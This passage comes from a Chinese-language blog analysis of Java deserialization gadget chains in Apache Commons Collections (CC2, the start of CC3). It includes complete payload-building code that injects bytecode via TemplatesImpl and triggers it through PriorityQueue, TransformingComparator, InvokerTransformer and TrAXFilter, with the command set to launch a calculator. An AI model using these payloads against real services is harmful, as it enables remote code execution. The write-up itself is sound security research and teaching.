<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TempTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//必须继承AbstractTranslet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, ClassNotFoundException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">/*构造恶意代码，并使用javassist生成字节码*/</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//得到默认classPool</span></span><br><span class="line">        <span class="keyword">final</span> CtClass ctClass= classPool.get(TempTest.class.getName());<span class="comment">//从ClassPool中获取属于TempTest的CtClass</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;LeiheheTest&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*创建TemplatesImpl对象*/</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">temp</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<span class="comment">//获取TemplatesImpl的Class类</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*修改_name*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templates,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">/*修改_class*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*修改_bytecodes*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*修改_tfactory*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_tfactory</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*call利用链的第一条来触发漏洞*/</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//templates.getOutputProperties(); //这条也可触发</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127215336783.png" alt="image-20211127215336783"></p>
<h3 id="CommonsCollections-2-利用链分析"><a href="#CommonsCollections-2-利用链分析" class="headerlink" title="CommonsCollections 2 利用链分析"></a>CommonsCollections 2 利用链分析</h3><p>经过上面的分析，我们已经知道了TemplateImpl类的利用链，只要我们找到能够call到利用链第一条<code>newTransfomer()</code>的地方，我们就可以找到反序列化点。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code>的<code>compare</code> 方法可以触发transform()方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这个transform()想起了什么？我们可以控制<code>transformer</code>的内容，然后执行<code>InvokerTransformer</code>的<code>transform()</code>方法。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>在cc1里，我们就分析过<code>InvokerTransformer</code>，不妨再来回顾一遍，加深记忆。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//此处是关键</span></span><br><span class="line">        &#125; </span><br><span class="line">        ...<span class="comment">//此处省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>中就有一个<code>transform()</code>的方法，如果传入的<code>input</code>不为空，那么我们就会依次获取<code>input</code>的Class类、<code>input</code>的某个method，并call我们获取到的方法。</p>
<p>那么在<code>InvokerTransformer</code>中，我们将<code>TemplateImpl</code>类的<code>object</code>作为<code>input</code>传进<code>transform()</code>方法里去就能成功触发了。</p>
<p>总结一下：我们可以通过 <code>TransformingComparator.compare()</code> 执行<code>InvokerTransformer</code>的<code>transform(我们的TemplateIml object)</code>，再执行<code>TemplateImpl</code>的<code>newTransformer()</code>方法</p>
<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>利用链中用到了<code>PriorityQueue</code>来触发<code>TransformingComparator</code>.</p>
<p>因为我们传入的序列化对象就是PriorityQueue，所以我们先从readObject()开始分析。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128194719960.png" alt="image-20211128194719960"></p>
<p>我们可以看到，queue中的元素会被反序列化，然后元素会被处理为二叉树类型 -&gt; **heapify()**。</p>
<h5 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="comment">//无符号右移1位</span></span><br><span class="line">        siftDown(i, (E) queue[i]);<span class="comment">//将queue中的元素传入siftDown</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法会寻找最后一个非叶子节点，然后使用siftDown方法。 需要注意的是，该处的size必须为2，因为当size为1时，<code>siftDown()</code>不会被call</p>
<h5 id="shiftDown"><a href="#shiftDown" class="headerlink" title="shiftDown"></a>shiftDown</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法判断comparator是否为空，如果不为空，则进入<code>siftDownUsingComparator()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128195530245.png" alt="image-20211128195530245"></p>
<p>注意x为queue中的元素，如果我们将<strong>comparator</strong>设为<strong>TransformingComparator</strong>，就可以连上之前的链了 - queue中的元素会作为<code>InvokerTransformer</code>的<code>input object</code>！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211202153617378.png" alt="image-20211202153617378"></p>
<p>再次总结一下：</p>
<ul>
<li>将<strong>comparator</strong>设为<strong>TransformingComparator</strong></li>
<li>在queue中加入两个元素，其中第一个元素为我们构造的<strong>templates</strong></li>
</ul>
<h3 id="Payload构造-1"><a href="#Payload构造-1" class="headerlink" title="Payload构造"></a>Payload构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建InvokerTransformer */</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// toString是为了保证在构造反序列化链的过程中不报错，只是起到占位的作用。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; InvokerTransformer.transform</span></span><br><span class="line">        queue.add(templates);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;n&quot;</span>));</span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//需要在最后一步修改，否则出错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，我们将反射方法写在两个method  - <code>setFieldValue()</code>和<code>getField()</code>中，方便使用。</p>
<h3 id="几个问题"><a href="#几个问题" class="headerlink" title="几个问题"></a>几个问题</h3><ol>
<li><p><strong>为什么在创建<code>InvokerTransformer</code>的时候，不直接通过constructor定义<code>iMethodName</code>为<code>newTransformer</code>？</strong></p>
<p>刚开始我也没搞明白，后来试了试，发现如果在创建<code>InvokerTransformer</code>的时候就修改method名字的话，在执行到<code>queue.add(1)</code>时会报错，如下图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);<span class="comment">//不能像这样直接定义method名字</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128234002277.png" alt="image-20211128234002277"></p>
</li>
</ol>
<p>进入**queue.add()**后：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);<span class="comment">//进入offer()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">        grow(i + <span class="number">1</span>);</span><br><span class="line">    size = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        queue[<span class="number">0</span>] = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);<span class="comment">//进入siftUp</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftUpUsingComparator(k, x);<span class="comment">//重点！</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUpComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)<span class="comment">//这里也会call compare，但是我们传过去的第二个元素并没有newTransformer方法，所以在生成payload的时候就会出错，所以我们需要把修改method放在queue.add()后面</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = e;</span><br><span class="line">        k = parent;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>为什么要add(new String(“n”))而不是add(1)?</strong></li>
</ol>
<p>通过跟踪服务端触发过程可以发现，<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129123207018.png" alt="image-20211129123207018">最先触发的总是队列中的第一个元素，如果第一个元素变成了1而不是<strong>templatesIml</strong>的话，我们就无法找到元素1当中的<strong>newTransformer</strong>方法，这时候会报错并抛出异常，无法执行到我们的恶意代码；但如果第一个元素是<strong>templatesIml</strong>的话，我们就可以执行到<strong>newTrasnformer</strong>方法。</p>
<p>同样，如果我们在payload中向queue中添加1而不是一个String类型，添加完毕后，queue会自动排序，将1排序到最前面，导致最后在server反序列化的时候会出错（如上方解释）。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/2.gif" alt="2"></p>
<p><strong>所以我们有两种方式来写这个payload，一种是我之前代码演示的那样。</strong></p>
<p><strong>第二种：也是ysoserial中使用的方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//先直接添加两个元素到queue里</span></span><br><span class="line"></span><br><span class="line">setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//修改方法名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后使用反射的方式，修改queue中的元素，这样就不会遇到在add的时候被自动排列的情况了</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[])getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">       <span class="keyword">return</span> field.get(obj);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>执行成功！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129124841260.png" alt="image-20211129124841260"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/232592">ysoserial CommonsCollections2 详细分析</a></p>
<p><a href="https://juejin.cn/post/6988477390276001829">JAVA双亲委派</a></p>
<p><a href="http://wjlshare.com/archives/1509">Java反序列化-CommonsCollections2分析</a></p>
<h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections:3.1</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="复现演示-1"><a href="#复现演示-1" class="headerlink" title="复现演示"></a>复现演示</h3><p>依然是使用ysoserial生成，然后curl命令执行，和之前的cc1和cc2一样，此处就不演示了。</p>
<h3 id="Commons-Collections-3-利用链分析"><a href="#Commons-Collections-3-利用链分析" class="headerlink" title="Commons Collections 3 利用链分析"></a>Commons Collections 3 利用链分析</h3><h4 id="TemplatesImpl-amp-javassist"><a href="#TemplatesImpl-amp-javassist" class="headerlink" title="TemplatesImpl &amp; javassist"></a>TemplatesImpl &amp; javassist</h4><p>同cc2一样，我们需要用<code>javassist</code>生成带命令执行的<strong>字节码</strong>，然后用<code>TemplatesImpl</code>将其加载到JVM。</p>
<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>在cc2中，InvokerTransformer的transform方法能够帮我们执行<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法，而在cc3中，我们找到了另一个class - <strong>TrAXFilter</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//直接call到newTransformer方法</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，TrAXFilter的构造器会直接call到<code>TransformerImpl</code>的<code>newTransformer()</code>方法，恰好<strong>TemplatesImpl</strong>和<strong>TransformerImpl</strong>都是继承<strong>Templates</strong>的。如果我们把<code>_templates</code>设置为我们自己构造的<code>TemplatesImpl instance</code>，命令就能被执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211130200257918.png" alt="image-20211130200257918"></p>
<p>因为我们的触发点是在<code>new TrAXFilter</code>的时候，<strong>所以我们需要在server反序列化我们的object的时候再执行这段代码，而不是我们自己在本地这样随便new一个就可以了。</strong></p>
<p>那么哪个类能够帮助我们new一个新的TrAXFilter呢？</p>
<h4 id="方法一：InvokerTransformer"><a href="#方法一：InvokerTransformer" class="headerlink" title="方法一：InvokerTransformer"></a>方法一：InvokerTransformer</h4><p><code>CommonsCollections 3.1</code>支持我们继续使用<code>InvokerTransformer</code></p>
<p>于是我们想到可以用<code>InvokerTransformer</code>来new一个新的<code>TrAXFilter</code>，下面我们先用反射的方式来写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">trAXFilterClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);<span class="comment">//获取Class</span></span><br><span class="line"><span class="comment">//Class trAXFilterClass = TrAXFilter.class//也可以直接这样，因为我们加载过该Class</span></span><br><span class="line">trAXFilterClass.getConstructor(TemplatesImpl.class).newInstance();<span class="comment">//获取constructor后再call newInstance</span></span><br></pre></td></tr></table></figure>

<p>我们尝试把上面的反射代码改写成InvokerTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;);<span class="comment">//先构造transformer的参数</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> i1.transform(TrAXFilter.class);<span class="comment">//call transform方法，返回一个constructor -&gt; constructor = TrAXFilter.class.getConstructor()</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;);</span><br><span class="line">i2.transform(constructor);<span class="comment">//constructor.newInstance()</span></span><br></pre></td></tr></table></figure>

<p>在这里我们可以直接构造<code>InvokerTransformer</code>，并在constructor传入方法参数 - 不像在cc2里，我们需要在<code>PriorityQueue.add()</code>之后修改 - 因为<code>PriorityQueue.add()</code>会在<strong>add</strong>的时候触发<code>comparator</code>从而<code>InvokerTransformer</code>的<code>transform()</code>方法，但在这里不会出现这种情况。</p>
<p>运行后成功弹出计算器。 </p>
<h4 id="方法二：InstantiateTransformer"><a href="#方法二：InstantiateTransformer" class="headerlink" title="方法二：InstantiateTransformer"></a>方法二：InstantiateTransformer</h4><p>除了使用<code>InvokerTransformer</code>来创建<code>TrAXFilter</code> instance，我们还可以通过一个新的Class <code>InstantiateTransformer</code>来完成。</p>
<p><code>InstantiateTransformer</code>的<code>transform()</code>方法中，有一处很明显的创建实例的代码。而它也是属于<code>Transformer</code>的实现类。使用该类，我们不再需要构造getConstructor这样的函数，因为他已经帮我做了，我们只需要传入<code>input</code>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201110012791.png" alt="image-20211201110012791"></p>
<p>我们现在尝试使用InstantiateTransformer来写一段POC：</p>
